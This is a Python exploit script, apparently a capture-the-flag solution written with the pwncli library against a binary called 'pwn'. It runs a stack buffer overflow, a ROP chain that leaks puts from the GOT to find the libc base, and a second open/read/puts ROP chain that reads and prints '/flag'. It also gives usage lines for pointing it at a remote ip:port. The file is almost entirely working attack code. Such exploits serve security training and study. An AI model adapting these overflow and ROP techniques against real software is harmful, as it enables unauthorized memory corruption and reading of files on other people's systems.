#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

pop_rdi_ret = CurrentGadgets.pop_rdi_ret()

ru(b'INPUT: \n')
payload = b"a"*0x40 + b"a"*8
payload += p64(pop_rdi_ret) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['vuln'])
sl(payload)

libc_base = u64_ex(ru(b"\n", drop=True)) - libc.sym.puts
lg("libc_base")

pop_rsi_ret = libc_base + 0x000000000002601f
pop_rdx_ret = libc_base + 0x0000000000142c92
buf_addr    = 0x404500

ru(b'INPUT: \n')
payload = b"a"*0x40 + b"a"*8
payload += p64(pop_rdi_ret) + p64(next(elf.search(b"/flag\x00")))
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(libc_base + libc.sym.open)
payload += p64(pop_rdi_ret) + p64(3)
payload += p64(pop_rsi_ret) + p64(buf_addr)
payload += p64(pop_rdx_ret) + p64(0x100)
payload += p64(libc_base + libc.sym.read)
payload += p64(pop_rdi_ret) + p64(buf_addr)
payload += p64(libc_base + libc.sym.puts)
sl(payload)

ia()
